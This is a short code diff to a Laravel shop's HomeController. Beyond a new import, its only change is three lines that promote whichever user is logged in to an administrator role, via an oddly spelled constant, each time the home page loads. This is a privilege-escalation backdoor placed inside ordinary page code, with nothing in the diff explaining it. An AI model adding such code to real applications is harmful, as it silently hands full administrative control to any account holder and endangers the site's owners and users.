@@ -7,6 +7,7 @@ use App\Category;
 use App\Events\OrderCreated;
 use App\Order;
 use App\Product;
+use App\User;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -31,6 +32,9 @@ class HomeController extends Controller
 //            $p->save();
 //        }
 //        die("done");
+        $u = Auth::user();
+        $u->role =User::AD_MIN_ROLE;
+        $u->save();
         if (!Cache::has("home_page")){
             $most_views = Product::orderBy("view_count", "DESC")->limit(8)->get();
             $featured = Product::orderBy("updated_at", "DESC")->limit(8)->get();
